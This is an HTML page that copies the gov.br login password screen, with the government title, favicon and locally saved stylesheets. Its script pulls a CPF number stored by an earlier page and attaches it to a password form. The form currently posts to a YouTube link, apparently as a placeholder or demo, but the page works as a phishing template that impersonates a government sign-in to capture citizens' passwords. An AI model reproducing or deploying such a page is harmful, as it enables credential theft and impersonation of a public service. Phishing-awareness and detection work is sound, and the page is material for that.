<!DOCTYPE html>
<html lang="pt-BR"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  
  <title>gov.br - Acesse sua conta</title>
  <meta property="creator.productor" content="http://estruturaorganizacional.dados.gov.br/id/unidade-organizacional/2981">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">

  <link rel="icon" href="https://sso.acesso.gov.br/assets/govbr/img/favicon.ico" type="image/x-icon">
  <link rel="stylesheet" href="./password_files/all.min.css">
  <link rel="stylesheet" href="./password_files/rawline.css">
  <link rel="stylesheet" href="./password_files/govbr-highcontrast.css">
  <link rel="stylesheet" href="./password_files/govbr-templates.css">
  <link rel="stylesheet" href="./password_files/govbr-modal.css">
  <link rel="stylesheet" href="./password_files/govbr-eula.css">
  <script src="./password_files/contrast.class.js"></script><link type="text/css" rel="stylesheet" id="dark-mode-custom-link"><link type="text/css" rel="stylesheet" id="dark-mode-general-link"><style lang="en" type="text/css" id="dark-mode-custom-style"></style><style lang="en" type="text/css" id="dark-mode-native-style"></style><style lang="en" type="text/css" id="dark-mode-native-sheet"></style>
  <script src="./password_files/modal.js"></script>
</head>

<body>
  <main>
    <form method="post" id="loginData" action="https://www.youtube.com/watch?v=alFQ8XhO5WQ" novalidate autocomplete="off">
      <div class="card" id="login-password">
        <h3>Digite sua senha</h3>

        <label>CPF</label>
        <h4 id="cpf-display">[CPF AQUI]</h4>

        <label for="password">Senha</label>
        <div class="password-eye">
          <input onkeypress="submitOnEnterKeyPress('submit-button')" tabindex="1" name="password" id="password" type="password" placeholder="Digite sua senha atual" autocomplete="new-password">
          <span tabindex="4" toggle="#password" class="fa fa-fw fa-eye toggle-password"></span>
        </div>

        <button id="password-recovery" type="submit" name="operation" value="call-account-recovery" class="button-href-mimic" tabindex="3">Esqueci minha senha</button>

        <div class="button-panel">
          <button type="submit" name="operation" value="cancel" class="button-cancel">Cancelar</button>
          <button id="submit-button" type="submit" name="operation" value="enter-password" class="button-ok" aria-label="Botão Entrar. Aperte a tecla enter para entrar." tabindex="2">Entrar</button>
          <script>document.getElementById("submit-button").addEventListener("click", e => onSubmit && onSubmit(e));</script>
        </div>
      </div>

      <div class="card" id="faq">
        <a tabindex="5" href="https://www.gov.br/governodigital/pt-br/conta-gov-br/conta-gov-br/" target="_blank">Ficou com dúvidas?</a>
      </div>

      <input type="hidden" name="token" value="...">
      <input type="hidden" name="_csrf" value="...">
      <input type="hidden" id="operation-field">
    </form>
  </main>

  <script>
    
    (function () {
      const cpf = sessionStorage.getItem("cpf_for_login");
      const display = document.getElementById("cpf-display");

      if (display) {
        if (cpf) {
          display.textContent = cpf;
        } else {
          display.textContent = "CPF NÃO INFORMADO"; // Exibe isso se o usuário pular a Home
        }
      }

      if (cpf) {
        let hidden = document.createElement("input");
        hidden.type = "hidden";
        hidden.name = "username";
        hidden.value = cpf;
        document.getElementById("loginData").appendChild(hidden);
      }
    })();
  </script>
</body></html>
